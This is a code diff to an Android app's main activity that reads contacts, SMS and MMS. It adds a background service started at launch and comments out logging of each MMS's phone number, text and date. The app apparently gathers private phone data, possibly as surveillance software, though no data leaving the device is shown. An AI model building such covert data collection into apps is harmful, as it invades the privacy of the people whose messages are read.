@@ -15,6 +15,7 @@ import com.postal.omniscient.postal.reader.contact.ReadContacts;
 import com.postal.omniscient.postal.reader.mms.ReadMms;
 import com.postal.omniscient.postal.reader.sms.ReadSms;
 import com.postal.omniscient.postal.reader.image.AllImages;
+import com.postal.omniscient.postal.service.MyService;
 
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
@@ -32,6 +33,12 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        
+        startService(new Intent(this, MyService.class));
+
+
+
+
         //CONTACTS
 //        getContacts();//in test
         //SMS
@@ -59,15 +66,15 @@ public class MainActivity extends AppCompatActivity {
 
         //MMS
         ReadMms mms = new ReadMms(getContentResolver());
-        Long buf_date;
-        for(AdapterData buf : mms.massAllMms()){
-            Log.i(Msg, "Id : "+buf.getId());
-            Log.i(Msg, "Phone : "+buf.getAddress());
-            Log.i(Msg, "Text : "+buf.getMsg());
-            buf_date = Long.parseLong(buf.getTime());
-            Log.i(Msg, "date : " + new SimpleDateFormat("dd/MM/yyyy HH:mm")
-                    .format(buf_date*1000));
-        }
+//        Long buf_date;
+//        for(AdapterData buf : mms.massAllMms()){
+//            Log.i(Msg, "Id : "+buf.getId());
+//            Log.i(Msg, "Phone : "+buf.getAddress());
+//            Log.i(Msg, "Text : "+buf.getMsg());
+//            buf_date = Long.parseLong(buf.getTime());
+//            Log.i(Msg, "date : " + new SimpleDateFormat("dd/MM/yyyy HH:mm")
+//                    .format(buf_date*1000));
+//        }
 //
 
 //        PhoneCall phoneCall = new PhoneCall();
